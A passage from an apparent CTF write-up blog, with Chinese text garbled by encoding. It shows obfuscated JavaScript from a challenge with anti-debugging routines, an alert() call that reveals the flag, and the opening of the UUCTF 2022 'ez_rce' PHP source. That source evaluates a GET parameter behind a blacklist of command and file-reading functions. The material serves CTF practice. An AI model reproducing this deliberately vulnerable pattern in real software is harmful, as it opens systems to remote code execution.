_0x22aa6e(_0x5483d7,_0x3792da,_0x5cb13b,_0x24729c)&#123;return _0x3b1f(_0x3792da- -_0x387847._0x35bca4,_0x24729c);&#125;return _0x9d6323[_0xe0b24e(-_0x3e95._0x1fdf8c,-_0x3e95._0x50244f,-<span class="hljs-number">0</span>x17,-_0x3e95._0x336362)]()[_0xe0b24e(_0x3e95._0x32496e,_0x3e95._0x160f93,_0x3e95._0xbb9faa,_0x3e95._0x23bbeb)](&#x27;(((.+)+)+)&#x27;+&#x27;+$&#x27;)[_0xe0b24e(-_0x3e95._0x51d26b,-_0x3e95._0x50244f,-_0x3e95._0x65072d,<span class="hljs-number">0</span>x2)]()[_0xe0b24e(-_0x3e95._0x188b75,_0x3e95._0x30008e,_0x3e95._0x1aab7d,-<span class="hljs-number">0</span>x1c)+&#x27;r&#x27;](_0x9d6323)[_0xe0b24e(_0x3e95._0x3b2c72,_0x3e95._0xf0b648,_0x3e95._0xba4d7,_0x3e95._0x377e40)](_0x186c58[_0xe0b24e(_0x3e95._0x5b4725,_0x3e95._0x435c34,<span class="hljs-number">0</span>x0,_0x3e95._0x4fd6df)]);&#125;);_0x9d6323();function _0x324fcb(_0xb79ef8,_0x5677da,_0x2aede5,_0x2b1b75)&#123;var _0x5afa09=&#123;_0xd41db0:<span class="hljs-number">0</span>xed&#125;;return _0x3b1f(_0xb79ef8-_0x5afa09._0xd41db0,_0x2aede5);&#125;var _0x18bc3c=(function()&#123;var _0x4a49a2=&#123;_0x112dad:<span class="hljs-number">0</span>xe5,_0x373d02:<span class="hljs-number">0</span>xc9,_0x279d60:<span class="hljs-number">0</span>xe4,_0x2afcc4:<span class="hljs-number">0</span>xc1,_0x1d4d88:<span class="hljs-number">0</span>x96,_0x218565:<span class="hljs-number">0</span>x9b,_0x305bb7:<span class="hljs-number">0</span>x80,_0x4c1214:<span class="hljs-number">0</span>x9c,_0x586b8d:<span class="hljs-number">0</span>x408,_0x57f03e:<span class="hljs-number">0</span>x3f4,_0x3d6243:<span class="hljs-number">0</span>x3fc,_0x13ddcd:<span class="hljs-number">0</span>x3e6,_0x1d9509:<span class="hljs-number">0</span>x3c3,_0x474faf:<span class="hljs-number">0</span>x3e2,_0x391269:<span class="hljs-number">0</span>xa9,_0x53a13b:<span class="hljs-number">0</span>xc0,_0x4117cc:<span class="hljs-number">0</span>xa8,_0x583742:<span class="hljs-number">0</span>xd9,_0x4235d6:<span class="hljs-number">0</span>xbe,_0x54aba5:<span class="hljs-number">0</span>xb8,_0x4e6853:<span class="hljs-number">0</span>xd3,_0x42b7f7:<span class="hljs-number">0</span>x3f0,_0x13ee23:<span class="hljs-number">0</span>x406,_0x298794:<span class="hljs-number">0</span>x421&#125;,_0x300566=&#123;_0x396a2d:<span class="hljs-number">0</span>x9c,_0x7a7a0d:<span class="hljs-number">0</span>xa1,_0x4c2fba:<span class="hljs-number">0</span>x9d,_0x19235f:<span class="hljs-number">0</span>x4dc,_0x3e9be9:<span class="hljs-number">0</span>x4f6,_0x23818b:<span class="hljs-number">0</span>x4fa,_0x3a19c1:<span class="hljs-number">0</span>x4e0,_0x6d52a1:<span class="hljs-number">0</span>xa6,_0x2ac2a7:<span class="hljs-number">0</span>x98,_0x4278a8:<span class="hljs-number">0</span>x8e,_0x3ea5e7:<span class="hljs-number">0</span>x94,_0x20d114:<span class="hljs-number">0</span>x90,_0x4d1d85:<span class="hljs-number">0</span>x508,_0xe0fbc7:<span class="hljs-number">0</span>x515,_0x9792cd:<span class="hljs-number">0</span>x51a,_0x215110:<span class="hljs-number">0</span>x51b,_0x52e8ac:<span class="hljs-number">0</span>x52c,_0x1b4243:<span class="hljs-number">0</span>x51f,_0x5a6497:<span class="hljs-number">0</span>x502,_0x59cd67:<span class="hljs-number">0</span>x512,_0x7a58f7:<span class="hljs-number">0</span>x4fe&#125;,_0x29d9e8=&#123;_0x1da745:<span class="hljs-number">0</span>x14c,_0x4495b7:<span class="hljs-number">0</span>x14,_0x5896f1:<span class="hljs-number">0</span>x141&#125;,_0x22f6a7=&#123;_0x149d1c:<span class="hljs-number">0</span>x3d1,_0x484949:<span class="hljs-number">0</span>x3f0,_0x580f1a:<span class="hljs-number">0</span>x3bf&#125;,_0x15680f=&#123;_0x468224:<span class="hljs-number">0</span>x12b,_0x33c27f:<span class="hljs-number">0</span>x1db&#125;,_0x3278e5=&#123;_0x45e6d5:<span class="hljs-number">0</span>x123&#125;,_0xa33426=&#123;&#x27;zPMSP&#x27;:function(_0xb99d44,_0x4b9584)&#123;return _0xb99d44(_0x4b9584);&#125;,&#x27;fiLai&#x27;:_0x446d48(_0x4a49a2._0x112dad,_0x4a49a2._0x373d02,_0x4a49a2._0x279d60,_0x4a49a2._0x2afcc4)+_0x446d48(_0x4a49a2._0x1d4d88,_0x4a49a2._0x218565,_0x4a49a2._0x305bb7,_0x4a49a2._0x4c1214)+_0xe3e054(_0x4a49a2._0x586b8d,<span class="hljs-number">0</span>x3fc,_0x4a49a2._0x57f03e,<span class="hljs-number">0</span>x40b)+_0xe3e054(_0x4a49a2._0x3d6243,_0x4a49a2._0x13ddcd,_0x4a49a2._0x1d9509,_0x4a49a2._0x474faf),&#x27;ZGfsJ&#x27;:function(_0xcd3e14,_0x4fa364)&#123;return _0xcd3e14===_0x4fa364;&#125;,&#x27;qNcZO&#x27;:_0x446d48(_0x4a49a2._0x391269,_0x4a49a2._0x53a13b,_0x4a49a2._0x4117cc,_0x4a49a2._0x583742),&#x27;soGRJ&#x27;:_0x446d48(<span class="hljs-number">0</span>xbf,_0x4a49a2._0x4235d6,_0x4a49a2._0x54aba5,_0x4a49a2._0x4e6853),&#x27;ApVsf&#x27;:_0xe3e054(_0x4a49a2._0x42b7f7,_0x4a49a2._0x13ee23,_0x4a49a2._0x298794,<span class="hljs-number">0</span>x407)&#125;,_0xfee301=!![];function _0xe3e054(_0x3a66fc,_0xd075cf,_0x7548c,_0xc35154)&#123;return _0x3b1f(_0xc35154-<span class="hljs-number">0</span>x21c,_0x7548c);&#125;function _0x446d48(_0x41529d,_0x3dba59,_0x2282f6,_0x5ef95b)&#123;return _0x3b1f(_0x3dba59- -_0x3278e5._0x45e6d5,_0x5ef95b);&#125;return function(_0xc143d7,_0x90f41b)&#123;var _0x41e43a=&#123;_0x3ff16e:<span class="hljs-number">0</span>x3e5,_0x43f9f0:<span class="hljs-number">0</span>x3fc,_0x2b3bc9:<span class="hljs-number">0</span>x3ee,_0x1c7550:<span class="hljs-number">0</span>x41b,_0x2049cf:<span class="hljs-number">0</span>x40e,_0x4a9905:<span class="hljs-number">0</span>x4e,_0x4bce32:<span class="hljs-number">0</span>x3f9,_0x53759a:<span class="hljs-number">0</span>x424,_0x32817f:<span class="hljs-number">0</span>x422,_0x5ebef2:<span class="hljs-number">0</span>x3f4,_0x3b13d5:<span class="hljs-number">0</span>x41f,_0x20ccb8:<span class="hljs-number">0</span>x3fb,_0x32d303:<span class="hljs-number">0</span>x407&#125;,_0x5ecfbd=&#123;_0x93ae96:<span class="hljs-number">0</span>x143,_0xb1250f:<span class="hljs-number">0</span>x2b&#125;,_0x537975=&#123;_0x4ca258:<span class="hljs-number">0</span>x11c,_0x4f2217:<span class="hljs-number">0</span>xd8&#125;;function _0x5bf8ef(_0x5296da,_0x42f36b,_0x571f63,_0x9f3a62)&#123;return _0xe3e054(_0x5296da-_0x15680f._0x468224,_0x42f36b-_0x15680f._0x33c27f,_0x571f63,_0x42f36b-<span class="hljs-number">0</span>x11a);&#125;var _0x594b74=&#123;&#x27;SZsAb&#x27;:function(_0x1202b6,_0x1044bd)&#123;var _0x1baa58=&#123;_0x19fa0c:<span class="hljs-number">0</span>x203&#125;;function _0x3f3f33(_0x221b2e,_0x58a14e,_0x3af901,_0x18bd53)&#123;return _0x3b1f(_0x221b2e-_0x1baa58._0x19fa0c,_0x18bd53);&#125;return _0xa33426[_0x3f3f33(_0x22f6a7._0x149d1c,<span class="hljs-number">0</span>x3da,_0x22f6a7._0x484949,_0x22f6a7._0x580f1a)](_0x1202b6,_0x1044bd);&#125;,&#x27;JCKBe&#x27;:_0xa33426[_0x2acb4d(_0x300566._0x396a2d,<span class="hljs-number">0</span>xbe,_0x300566._0x7a7a0d,_0x300566._0x4c2fba)],&#x27;zUmhZ&#x27;:function(_0x378e99,_0xb87400)&#123;return _0xa33426[&#x27;ZGfsJ&#x27;](_0x378e99,_0xb87400);&#125;,&#x27;NZqDE&#x27;:_0xa33426[_0x5bf8ef(_0x300566._0x19235f,_0x300566._0x3e9be9,_0x300566._0x23818b,_0x300566._0x3a19c1)],&#x27;uRgDI&#x27;:function(_0x45bd46,_0x25be26)&#123;return _0x45bd46===_0x25be26;&#125;,&#x27;uKrlz&#x27;:_0xa33426[_0x2acb4d(<span class="hljs-number">0</span>x82,_0x300566._0x6d52a1,<span class="hljs-number">0</span>x96,_0x300566._0x2ac2a7)]&#125;;function _0x2acb4d(_0x3b9921,_0x18c824,_0x1fd099,_0x257daf)&#123;return _0x446d48(_0x3b9921-_0x29d9e8._0x1da745,_0x1fd099- -_0x29d9e8._0x4495b7,_0x1fd099-_0x29d9e8._0x5896f1,_0x257daf);&#125;if(_0xa33426[_0x2acb4d(_0x300566._0x4278a8,_0x300566._0x7a7a0d,_0x300566._0x3ea5e7,_0x300566._0x20d114)](_0xa33426[_0x5bf8ef(_0x300566._0x4d1d85,_0x300566._0xe0fbc7,<span class="hljs-number">0</span>x4f9,_0x300566._0x9792cd)],_0xa33426[_0x5bf8ef(_0x300566._0x215110,_0x300566._0xe0fbc7,<span class="hljs-number">0</span>x516,_0x300566._0x52e8ac)]))&#123;var _0x28ec78=_0xfee301?function()&#123;function _0x3d8db4(_0x300069,_0x29931f,_0x428701,_0x1afffd)&#123;return _0x2acb4d(_0x300069-<span class="hljs-number">0</span>x1d3,_0x29931f-_0x537975._0x4ca258,_0x300069- -_0x537975._0x4f2217,_0x428701);&#125;function _0x20a2ae(_0x13db61,_0x3e36fb,_0x53d342,_0x2a2910)&#123;return _0x2acb4d(_0x13db61-_0x5ecfbd._0x93ae96,_0x3e36fb-_0x5ecfbd._0xb1250f,_0x3e36fb-<span class="hljs-number">0</span>x374,_0x2a2910);&#125;if(_0x594b74[_0x20a2ae(_0x41e43a._0x3ff16e,_0x41e43a._0x43f9f0,_0x41e43a._0x2b3bc9,_0x41e43a._0x1c7550)](_0x20a2ae(<span class="hljs-number">0</span>x3f0,<span class="hljs-number">0</span>x407,<span class="hljs-number">0</span>x412,_0x41e43a._0x2049cf),_0x594b74[&#x27;NZqDE&#x27;]))&#123;if(_0x4ce282)&#123;var _0x3856d2=_0x540010[&#x27;apply&#x27;](_0x3fc19a,arguments);return _0x43e8c9=null,_0x3856d2;&#125;&#125;else&#123;if(_0x90f41b)&#123;if(_0x594b74[_0x3d8db4(-_0x41e43a._0x4a9905,-<span class="hljs-number">0</span>x44,-<span class="hljs-number">0</span>x3e,-<span class="hljs-number">0</span>x48)](_0x594b74[_0x20a2ae(_0x41e43a._0x4bce32,<span class="hljs-number">0</span>x404,_0x41e43a._0x53759a,_0x41e43a._0x32817f)],&#x27;cjnwI&#x27;))return _0x594b74[&#x27;SZsAb&#x27;](_0x1c3fd3,_0x594b74[_0x20a2ae(_0x41e43a._0x5ebef2,<span class="hljs-number">0</span>x40c,<span class="hljs-number">0</span>x41c,<span class="hljs-number">0</span>x413)]),![];else&#123;var _0x6a796=_0x90f41b[_0x20a2ae(_0x41e43a._0x3b13d5,<span class="hljs-number">0</span>x409,_0x41e43a._0x20ccb8,_0x41e43a._0x32d303)](_0xc143d7,arguments);return _0x90f41b=null,_0x6a796;&#125;&#125;&#125;&#125;:function()&#123;&#125;;return _0xfee301=![],_0x28ec78;&#125;else&#123;if(_0x3edea5)&#123;var _0x42ccd2=_0x53f582[_0x5bf8ef(_0x300566._0x1b4243,_0x300566._0x5a6497,_0x300566._0x59cd67,_0x300566._0x7a58f7)](_0x46b7f7,arguments);return _0x4f0275=null,_0x42ccd2;&#125;&#125;&#125;;&#125;());function _0xe4a674(_0x4f361c,_0x342d49,_0x2d96fd,_0x4ee16d)&#123;var _0xa495a5=&#123;_0x26aaa4:<span class="hljs-number">0</span>x3a6&#125;;return _0x3b1f(_0x342d49-_0xa495a5._0x26aaa4,_0x4ee16d);&#125;var _0x5a7a9e=_0x18bc3c(this,function()&#123;var _0x4144aa=&#123;_0x4f61c6:<span class="hljs-number">0</span>x45,_0x4ec412:<span class="hljs-number">0</span>x52,_0x4466f1:<span class="hljs-number">0</span>x5b,_0x59405e:<span class="hljs-number">0</span>x41,_0x5402ec:<span class="hljs-number">0</span>x30,_0x23a7b5:<span class="hljs-number">0</span>x19,_0x39cdb3:<span class="hljs-number">0</span>xc,_0xa27ff5:<span class="hljs-number">0</span>x2a,_0x27781b:<span class="hljs-number">0</span>x11,_0x28ad57:<span class="hljs-number">0</span>x27,_0x42431b:<span class="hljs-number">0</span>xf,_0x58e6a6:<span class="hljs-number">0</span>x44,_0x1fe380:<span class="hljs-number">0</span>x3d,_0x41c840:<span class="hljs-number">0</span>x3e,_0x477930:<span class="hljs-number">0</span>x57,_0x9c4a22:<span class="hljs-number">0</span>x46,_0x2d9097:<span class="hljs-number">0</span>x40,_0xc7b3a9:<span class="hljs-number">0</span>x2c,_0x5d5f63:<span class="hljs-number">0</span>x26,_0x168a67:<span class="hljs-number">0</span>x22,_0x176432:<span class="hljs-number">0</span>x35,_0x5a4a44:<span class="hljs-number">0</span>x3a,_0x41ed0d:<span class="hljs-number">0</span>x51,_0x22ff6f:<span class="hljs-number">0</span>x17,_0x4f793a:<span class="hljs-number">0</span>x21,_0x14c440:<span class="hljs-number">0</span>x2f,_0x20e197:<span class="hljs-number">0</span>x49,_0x34dff4:<span class="hljs-number">0</span>x48,_0x59b287:<span class="hljs-number">0</span>x4c,_0x507934:<span class="hljs-number">0</span>x47,_0x21b0c8:<span class="hljs-number">0</span>x64,_0x4f8687:<span class="hljs-number">0</span>x39,_0x1f3a88:<span class="hljs-number">0</span>x48,_0x2aba12:<span class="hljs-number">0</span>x5a,_0x422a11:<span class="hljs-number">0</span>x5f,_0x18f7c3:<span class="hljs-number">0</span>x4f,_0xff3bc2:<span class="hljs-number">0</span>x6a,_0x108211:<span class="hljs-number">0</span>x35,_0x2caa7a:<span class="hljs-number">0</span>x43,_0x4e740c:<span class="hljs-number">0</span>x5e,_0x18d7cd:<span class="hljs-number">0</span>x3f,_0x47cc51:<span class="hljs-number">0</span>x2d,_0x2a7dfb:<span class="hljs-number">0</span>x3a,_0x2289cf:<span class="hljs-number">0</span>x4d,_0x5c6a95:<span class="hljs-number">0</span>x61,_0x50cdcd:<span class="hljs-number">0</span>x1,_0x51ba5d:<span class="hljs-number">0</span>x18,_0x16a5c4:<span class="hljs-number">0</span>x1b,_0x2710b4:<span class="hljs-number">0</span>x52,_0x20ce72:<span class="hljs-number">0</span>x36,_0x27cb18:<span class="hljs-number">0</span>x3d,_0x48b65d:<span class="hljs-number">0</span>x27,_0x37efbc:<span class="hljs-number">0</span>x20,_0x5a5b51:<span class="hljs-number">0</span>x33,_0x46aa95:<span class="hljs-number">0</span>x3c,_0x1e2298:<span class="hljs-number">0</span>x34,_0x20110d:<span class="hljs-number">0</span>x58,_0x254af3:<span class="hljs-number">0</span>x42,_0x1a94f1:<span class="hljs-number">0</span>x1e,_0x5ada1f:<span class="hljs-number">0</span>x31,_0x196f40:<span class="hljs-number">0</span>x34,_0x4a8c85:<span class="hljs-number">0</span>x28,_0x47addc:<span class="hljs-number">0</span>x19,_0x30822d:<span class="hljs-number">0</span>x24,_0x3e249d:<span class="hljs-number">0</span>x2e,_0x2b26e0:<span class="hljs-number">0</span>x58,_0x4f3690:<span class="hljs-number">0</span>x47,_0x3c504c:<span class="hljs-number">0</span>x50,_0x1a2215:<span class="hljs-number">0</span>x6f,_0x39fe3a:<span class="hljs-number">0</span>x4a,_0x4fd901:<span class="hljs-number">0</span>x45,_0x10de2d:<span class="hljs-number">0</span>x1f,_0x2a2458:<span class="hljs-number">0</span>x25,_0x58203e:<span class="hljs-number">0</span>x1a&#125;,_0x516e80=&#123;_0x5cb0d8:<span class="hljs-number">0</span>x211&#125;,_0x5d0dad=&#123;_0x1613ab:<span class="hljs-number">0</span>x1ff&#125;,_0x1550b6=&#123;_0x140e00:<span class="hljs-number">0</span>x89,_0x607bd8:<span class="hljs-number">0</span>x75,_0x4b17ac:<span class="hljs-number">0</span>x6c,_0x49bd64:<span class="hljs-number">0</span>x69,_0x3f68a9:<span class="hljs-number">0</span>x139,_0x2ddba9:<span class="hljs-number">0</span>x10b,_0xde357b:<span class="hljs-number">0</span>x129,_0x4cdfc3:<span class="hljs-number">0</span>x127,_0x57e7ef:<span class="hljs-number">0</span>x12e,_0x5880b7:<span class="hljs-number">0</span>x11c&#125;,_0x3192e1=&#123;_0xc8443:<span class="hljs-number">0</span>x1df,_0x46ec9d:<span class="hljs-number">0</span>x6a,_0x28ff76:<span class="hljs-number">0</span>x18&#125;,_0x4a808f=&#123;_0x4b5811:<span class="hljs-number">0</span>xb5,_0x32e532:<span class="hljs-number">0</span>x14a&#125;,_0x5c60d1=&#123;&#x27;hBTTo&#x27;:function(_0x25fb20,_0x12189f)&#123;return _0x25fb20(_0x12189f);&#125;,&#x27;uIXZH&#x27;:function(_0xb7d19a,_0x59fe0a)&#123;return _0xb7d19a+_0x59fe0a;&#125;,&#x27;ImzSF&#x27;:_0x267e4f(-_0x4144aa._0x4f61c6,-_0x4144aa._0x4ec412,-_0x4144aa._0x4466f1,-_0x4144aa._0x59405e)+_0x4a6379(-_0x4144aa._0x5402ec,-_0x4144aa._0x23a7b5,-_0x4144aa._0x39cdb3,-_0x4144aa._0xa27ff5),&#x27;lJzaJ&#x27;:_0x4a6379(-_0x4144aa._0x27781b,-_0x4144aa._0x28ad57,-<span class="hljs-number">0</span>xe,-_0x4144aa._0x42431b)+_0x267e4f(-<span class="hljs-number">0</span>x5a,-_0x4144aa._0x58e6a6,-_0x4144aa._0x1fe380,-<span class="hljs-number">0</span>x2c)+_0x4a6379(-_0x4144aa._0x41c840,-_0x4144aa._0x477930,-<span class="hljs-number">0</span>x5a,-_0x4144aa._0x9c4a22)+&#x27;\x20)&#x27;,&#x27;kEHtY&#x27;:function(_0x2b88a3)&#123;return _0x2b88a3();&#125;,&#x27;fHNYw&#x27;:_0x4a6379(-<span class="hljs-number">0</span>x1b,-_0x4144aa._0x2d9097,-_0x4144aa._0xc7b3a9,-_0x4144aa._0x5d5f63),&#x27;CVRPZ&#x27;:_0x4a6379(-_0x4144aa._0x168a67,-_0x4144aa._0x176432,-<span class="hljs-number">0</span>x28,-_0x4144aa._0x5a4a44),&#x27;yilcq&#x27;:_0x267e4f(-_0x4144aa._0x41ed0d,-_0x4144aa._0x477930,-<span class="hljs-number">0</span>x59,-<span class="hljs-number">0</span>x77),&#x27;wUKnB&#x27;:&#x27;exception&#x27;,&#x27;KihKC&#x27;:&#x27;trace&#x27;,&#x27;iCuce&#x27;:function(_0x15cdbf,_0x284bba)&#123;return _0x15cdbf===_0x284bba;&#125;,&#x27;aVzQL&#x27;:_0x267e4f(-_0x4144aa._0x22ff6f,-_0x4144aa._0x4f793a,-_0x4144aa._0x14c440,-_0x4144aa._0x20e197)&#125;,_0x333977=function()&#123;function _0x5b1501(_0x5f3aa4,_0x2ebac2,_0x3cf02c,_0x21e2be)&#123;return _0x4a6379(_0x5f3aa4-_0x4a808f._0x4b5811,_0x5f3aa4,_0x3cf02c-_0x4a808f._0x32e532,_0x2ebac2- -<span class="hljs-number">0</span>xfc);&#125;var _0x5f3690;function _0xfa6b34(_0x541643,_0x242a5d,_0x3b6829,_0x486be3)&#123;return _0x267e4f(_0x541643-_0x3192e1._0xc8443,_0x242a5d-_0x3192e1._0x46ec9d,_0x242a5d- -_0x3192e1._0x28ff76,_0x486be3);&#125;try&#123;_0x5f3690=_0x5c60d1[&#x27;hBTTo&#x27;](Function,_0x5c60d1[_0xfa6b34(-_0x1550b6._0x140e00,-_0x1550b6._0x607bd8,-_0x1550b6._0x4b17ac,-_0x1550b6._0x49bd64)](_0x5c60d1[_0x5b1501(-_0x1550b6._0x3f68a9,-<span class="hljs-number">0</span>x120,-<span class="hljs-number">0</span>x103,-<span class="hljs-number">0</span>x129)]+(_0x5b1501(-<span class="hljs-number">0</span>x123,-_0x1550b6._0x2ddba9,-<span class="hljs-number">0</span>x107,-<span class="hljs-number">0</span>x10d)+_0x5b1501(-_0x1550b6._0xde357b,-_0x1550b6._0x4cdfc3,-_0x1550b6._0x57e7ef,-_0x1550b6._0x5880b7)+&#x27;rn\x20this\x22)(&#x27;+&#x27;\x20)&#x27;),&#x27;);&#x27;))();&#125;catch(_0xdb4722)&#123;_0x5f3690=window;&#125;return _0x5f3690;&#125;,_0x184b95=_0x5c60d1[_0x267e4f(-<span class="hljs-number">0</span>x5b,-_0x4144aa._0x34dff4,-<span class="hljs-number">0</span>x48,-_0x4144aa._0x59b287)](_0x333977),_0x3692ac=_0x184b95[_0x4a6379(-_0x4144aa._0x507934,-_0x4144aa._0x21b0c8,-_0x4144aa._0x4f8687,-_0x4144aa._0x34dff4)]=_0x184b95[_0x267e4f(-_0x4144aa._0x1f3a88,-<span class="hljs-number">0</span>x74,-_0x4144aa._0x2aba12,-<span class="hljs-number">0</span>x78)]||&#123;&#125;;function _0x4a6379(_0x247b48,_0x32c30d,_0x193949,_0x47b8dc)&#123;return _0x3b1f(_0x47b8dc- -_0x5d0dad._0x1613ab,_0x32c30d);&#125;var _0x5a0618=[_0x5c60d1[_0x267e4f(-_0x4144aa._0x41c840,-_0x4144aa._0x422a11,-_0x4144aa._0x18f7c3,-_0x4144aa._0xff3bc2)],_0x5c60d1[&#x27;CVRPZ&#x27;],_0x5c60d1[&#x27;yilcq&#x27;],&#x27;error&#x27;,_0x5c60d1[&#x27;wUKnB&#x27;],&#x27;table&#x27;,_0x5c60d1[_0x267e4f(-<span class="hljs-number">0</span>x51,-<span class="hljs-number">0</span>x50,-_0x4144aa._0x108211,-<span class="hljs-number">0</span>x2f)]];function _0x267e4f(_0x461525,_0xfee197,_0x3156e7,_0x46e751)&#123;return _0x3b1f(_0x3156e7- -_0x516e80._0x5cb0d8,_0x46e751);&#125;for(var _0x3524db=<span class="hljs-number">0</span>xf*-<span class="hljs-number">0</span>x51+-<span class="hljs-number">0</span>x17db+<span class="hljs-number">0</span>x1c9a;_0x3524db&lt;_0x5a0618[_0x267e4f(-_0x4144aa._0x2caa7a,-_0x4144aa._0x4e740c,-<span class="hljs-number">0</span>x5c,-_0x4144aa._0x18d7cd)];_0x3524db++)&#123;if(_0x5c60d1[_0x267e4f(-_0x4144aa._0x47cc51,-_0x4144aa._0x2a7dfb,-_0x4144aa._0x2289cf,-_0x4144aa._0x5c6a95)](_0x5c60d1[_0x267e4f(-<span class="hljs-number">0</span>x51,-<span class="hljs-number">0</span>x76,-_0x4144aa._0x477930,-_0x4144aa._0x21b0c8)],_0x4a6379(<span class="hljs-number">0</span>x3,_0x4144aa._0x50cdcd,-_0x4144aa._0x51ba5d,-_0x4144aa._0x16a5c4)))&#123;var _0x242bf8;try&#123;_0x242bf8=_0x391b0a(_0x5c60d1[_0x267e4f(-<span class="hljs-number">0</span>x52,-_0x4144aa._0x2710b4,-_0x4144aa._0x20ce72,-_0x4144aa._0x27cb18)]+_0x5c60d1[&#x27;lJzaJ&#x27;]+&#x27;);&#x27;)();&#125;catch(_0x35c4c3)&#123;_0x242bf8=_0x56ea5b;&#125;return _0x242bf8;&#125;else&#123;var _0x51616c=(_0x267e4f(-_0x4144aa._0x2caa7a,-<span class="hljs-number">0</span>x15,-_0x4144aa._0x48b65d,-_0x4144aa._0x37efbc)+&#x27;<span class="hljs-number">3</span>&#x27;)[_0x267e4f(-_0x4144aa._0x5402ec,-_0x4144aa._0x5a5b51,-<span class="hljs-number">0</span>x3f,-_0x4144aa._0x18d7cd)](&#x27;|&#x27;),_0x2f48bc=<span class="hljs-number">0</span>x251*-<span class="hljs-number">0</span>x1+-<span class="hljs-number">0</span>x2436+<span class="hljs-number">0</span>x2687;while(!![])&#123;switch(_0x51616c[_0x2f48bc++])&#123;case&#x27;<span class="hljs-number">0</span>&#x27;:var _0x468a4d=_0x3692ac[_0x14b7da]||_0x58126c;continue;case&#x27;<span class="hljs-number">1</span>&#x27;:var _0x14b7da=_0x5a0618[_0x3524db];continue;case&#x27;<span class="hljs-number">2</span>&#x27;:var _0x58126c=_0x18bc3c[_0x4a6379(-_0x4144aa._0x46aa95,-_0x4144aa._0x1e2298,-_0x4144aa._0x20110d,-_0x4144aa._0x254af3)+&#x27;r&#x27;][_0x4a6379(-_0x4144aa._0x1a94f1,-_0x4144aa._0x5ada1f,-_0x4144aa._0x196f40,-_0x4144aa._0x4a8c85)][_0x267e4f(-<span class="hljs-number">0</span>x47,-_0x4144aa._0x47addc,-_0x4144aa._0xc7b3a9,-<span class="hljs-number">0</span>x28)](_0x18bc3c);continue;case&#x27;<span class="hljs-number">3</span>&#x27;:_0x3692ac[_0x14b7da]=_0x58126c;continue;case&#x27;<span class="hljs-number">4</span>&#x27;:_0x58126c[_0x4a6379(-_0x4144aa._0x5402ec,-_0x4144aa._0x14c440,-_0x4144aa._0x30822d,-_0x4144aa._0x4f793a)]=_0x18bc3c[_0x267e4f(-_0x4144aa._0x4f8687,-_0x4144aa._0x3e249d,-_0x4144aa._0xc7b3a9,-_0x4144aa._0x59405e)](_0x18bc3c);continue;case&#x27;<span class="hljs-number">5</span>&#x27;:_0x58126c[_0x267e4f(-_0x4144aa._0x2b26e0,-_0x4144aa._0x4f3690,-_0x4144aa._0x4e740c,-_0x4144aa._0x3c504c)]=_0x468a4d[_0x267e4f(-_0x4144aa._0x1a2215,-_0x4144aa._0x39fe3a,-_0x4144aa._0x4e740c,-_0x4144aa._0x4fd901)][_0x4a6379(-_0x4144aa._0x10de2d,-_0x4144aa._0x168a67,-_0x4144aa._0x2a2458,-_0x4144aa._0x58203e)](_0x468a4d);continue;&#125;break;&#125;&#125;&#125;&#125;);_0x5a7a9e();<br></code></pre></td></tr></table></figure>
<p>ç„¶åå†æ‰§è¡Œ</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">alert</span>(_0x324fcb(<span class="hljs-number">0</span>x2d9,<span class="hljs-number">0</span>x2c3,<span class="hljs-number">0</span>x2db,<span class="hljs-number">0</span>x2f3)+&#x27;k3r_h0pe_t&#x27;+_0xe4a674(<span class="hljs-number">0</span>x5a1,<span class="hljs-number">0</span>x595,<span class="hljs-number">0</span>x59e,<span class="hljs-number">0</span>x57c)+&#x27;irlfriend&#125;&#x27;)<br></code></pre></td></tr></table></figure>

<p><img src="/images/D6CB2DBB23DC4b458FD2AD853C6C7FDC.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="UUCTF-2022-æ–°ç”Ÿèµ›-ez-rce"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ez-rce" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ez_rce"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ez_rce</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;?php<br>## æ”¾å¼ƒæŠŠï¼Œå°ä¼™å­ï¼Œä½ çœŸçš„ä¸ä¼šRCE,ä½•å¿…åœ¨æ­¤çº ç»“å‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ<br><span class="hljs-keyword">if</span>(isset($_GET<span class="hljs-literal">[&#x27;<span class="hljs-identifier">code</span>&#x27;]</span>))&#123;<br>    $code=$_GET<span class="hljs-literal">[&#x27;<span class="hljs-identifier">code</span>&#x27;]</span>;<br>    <span class="hljs-keyword">if</span> (!preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">sys</span>|<span class="hljs-params">pas</span>|<span class="hljs-params">read</span>|<span class="hljs-params">file</span>|<span class="hljs-params">ls</span>|<span class="hljs-params">cat</span>|<span class="hljs-params">tac</span>|<span class="hljs-params">head</span>|<span class="hljs-params">tail</span>|<span class="hljs-params">more</span>|<span class="hljs-params">less</span>|<span class="hljs-params">php</span>|<span class="hljs-params">base</span>|<span class="hljs-params">echo</span>|<span class="hljs-params">cp</span>|\$|\<span class="hljs-operator">*</span>|\+|\^|<span class="hljs-params">scan</span>|\.|<span class="hljs-params">local</span>|<span class="hljs-params">current</span>|<span class="hljs-params">chr</span>|<span class="hljs-params">crypt</span>|<span class="hljs-params">show_source</span>|<span class="hljs-params">high</span>|<span class="hljs-params">readgzfile</span>|<span class="hljs-params">dirname</span>|<span class="hljs-params">time</span>|<span class="hljs-params">next</span>|<span class="hljs-params">all</span>|<span class="hljs-params">hex2bin</span>|<span class="hljs-params">im</span>|<span class="hljs-params">shell</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>&#x27;,$<span class="hljs-params">code</span>)</span>)&#123;<br>        echo &#x27;çœ‹çœ‹ä½ è¾“å…¥çš„å‚æ•°ï¼ï¼ï¼ä¸å«æ ·å­ï¼ï¼&#x27;;echo 